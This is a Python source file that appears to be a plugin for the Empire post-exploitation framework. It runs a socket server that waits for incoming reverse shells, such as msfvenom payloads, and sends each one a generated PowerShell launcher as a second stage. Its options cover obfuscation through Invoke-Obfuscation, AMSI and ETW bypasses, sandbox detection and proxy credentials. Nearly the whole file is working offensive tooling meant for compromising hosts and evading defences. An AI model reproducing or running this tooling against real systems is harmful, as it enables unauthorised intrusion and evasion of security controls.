from __future__ import print_function

import socket

from empire.server.common.plugins import Plugin
import empire.server.common.helpers as helpers


class Plugin(Plugin):
    description = "Empire reverseshell stager server plugin."

    def onLoad(self):
        print(helpers.color("[*] Loading Empire reverseshell server plugin"))
        self.info = {
                        'Name': 'reverseshell_stager_server',

                        'Author': ['@Cx01N'],

                        'Description': ('Server for reverseshell using msfvenom to act as a stage 0.'),

                        'Software': '',

                        'Techniques': [''],

                        'Comments': []
                    },

        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Listener': {
                'Description': 'Listener to generate stager for.',
                'Required': True,
                'Value': ''
            },
            'LocalHost': {
                'Description': 'Address for the reverse shell to connect back to.',
                'Required': True,
                'Value': '0.0.0.0'
            },
            'LocalPort': {
                'Description': 'Port on local host for the reverse shell.',
                'Required': True,
                'Value': '9999'
            },
            'Language': {
                'Description': 'Language of the stager to generate.',
                'Required': True,
                'Value': 'powershell',
                'SuggestedValues': ['powershell'],
                'Strict': True
            },
            'StagerRetries': {
                'Description': 'Times for the stager to retry connecting.',
                'Required': False,
                'Value': '0'
            },
            'OutFile': {
                'Description': 'Filename that should be used for the generated output.',
                'Required': False,
                'Value': 'launcher.exe'
            },
            'Base64': {
                'Description': 'Switch. Base64 encode the output.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'Obfuscate': {
                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
                'Required': False,
                'Value': 'False',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'ObfuscateCommand': {
                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
                'Required': False,
                'Value': r'Token\All\1'
            },
            'SafeChecks': {
                'Description': 'Switch. Checks for LittleSnitch or a SandBox, exit the staging process if true. Defaults to True.',
                'Required': True,
                'Value': 'True',
                'SuggestedValues': ['True', 'False'],
                'Strict': True
            },
            'UserAgent': {
                'Description': 'User-agent string to use for the staging request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Proxy': {
                'Description': 'Proxy to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'ProxyCreds': {
                'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required': False,
                'Value': 'default'
            },
            'Bypasses': {
                'Description': 'Bypasses as a space separated list to be prepended to the launcher',
                'Required': False,
                'Value': 'mattifestation etw'
            },
            'Status': {
                'Description': '<start/stop/status>',
                'Required': True,
                'Value': 'start',
                'SuggestedValues': ['start', 'stop', 'status'],
                'Strict': True
            },
        }

    def execute(self, command):
        try:
            self.reverseshell_proc = None
            self.status = self.options['Status']['Value']
            results = self.do_server('')
            return results
        except Exception as e:
            print(e)
            self.main_menu.plugin_socketio_message(self.info[0]['Name'], f'[!] {e}')
            return False

    def get_commands(self):
        return self.commands

    def register(self, mainMenu):
        """
        any modifications to the mainMenu go here - e.g.
        registering functions to be run by user commands
        """
        mainMenu.__class__.do_server = self.do_server
        self.installPath = mainMenu.installPath
        self.main_menu = mainMenu

    def do_server(self, *args):
        """
        Check if the Empire C# server is already running.
        """
        if self.reverseshell_proc:
            self.enabled = True
        else:
            self.enabled = False

        if self.status == "status":
            if self.enabled:
                self.main_menu.plugin_socketio_message(self.info[0]['Name'], "[+] Reverseshell server is currently running")
            else:
                self.main_menu.plugin_socketio_message(self.info[0]['Name'], "[!] Reverseshell server is currently stopped")

        elif self.status == "stop":
            if self.enabled:
                self.reverseshell_proc.kill()
                self.main_menu.plugin_socketio_message(self.info[0]['Name'], "[!] Stopped reverseshell server")
            else:
                self.main_menu.plugin_socketio_message(self.info[0]['Name'], "[!] Reverseshell server is already stopped")

        elif self.status == "start":
            # extract all of our options
            language = self.options['Language']['Value']
            listener_name = self.options['Listener']['Value']
            base64 = self.options['Base64']['Value']
            obfuscate = self.options['Obfuscate']['Value']
            obfuscate_command = self.options['ObfuscateCommand']['Value']
            user_agent = self.options['UserAgent']['Value']
            proxy = self.options['Proxy']['Value']
            proxy_creds = self.options['ProxyCreds']['Value']
            stager_retries = self.options['StagerRetries']['Value']
            safe_checks = self.options['SafeChecks']['Value']
            lhost = self.options['LocalHost']['Value']
            lport = self.options['LocalPort']['Value']

            encode = False
            if base64.lower() == "true":
                encode = True

            invoke_obfuscation = False
            if obfuscate.lower() == "true":
                invoke_obfuscation = True

            # generate the launcher code
            self.launcher = self.main_menu.stagers.generate_launcher(listener_name, language=language, encode=encode,
                                                                     obfuscate=invoke_obfuscation,
                                                                     obfuscationCommand=obfuscate_command,
                                                                     userAgent=user_agent, proxy=proxy,
                                                                     proxyCreds=proxy_creds,
                                                                     stagerRetries=stager_retries,
                                                                     safeChecks=safe_checks,
                                                                     bypasses=self.options['Bypasses']['Value'])

            if self.launcher == "":
                self.main_menu.plugin_socketio_message(self.info[0]['Name'], "[!] Error in launcher command generation.")
                return ""

            self.reverseshell_proc = helpers.KThread(target=self.server_listen, args=(str(lhost), str(lport)))
            self.reverseshell_proc.daemon = True
            self.reverseshell_proc.start()

    def shutdown(self):
        try:
            self.reverseshell_proc.kill()
            self.thread.kill()
        except:
            pass
        return

    def client_handler(self, client_socket):
        self.thread = helpers.KThread(target=self.o, args=[client_socket])
        self.thread.daemon = True
        self.thread.start()
        try:
            buffer = self.launcher + '\n'
            client_socket.send(buffer.encode())
        except KeyboardInterrupt:
            client_socket.close()
        except:
            client_socket.close()

    def server_listen(self, host, port):
        try:
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.bind((host, int(port)))
        except:
            return f"[!] Can't bind at {host}:{port}"

        self.main_menu.plugin_socketio_message(self.info[0]['Name'], "[*] Listening on %s ..." % port)
        server.listen(5)

        try:
            while self.status == 'start':
                client_socket, addr = server.accept()
                self.client_handler(client_socket)
        except KeyboardInterrupt:
            return None

    def o(self, s):
        while 1:
            try:
                data = ''
                while 1:
                    packet = s.recv(1024)
                    data += packet.decode()
                    if len(packet) < 1024:
                        break
                if not len(data):
                    s.close()
                    break
            except:
                s.close()
                break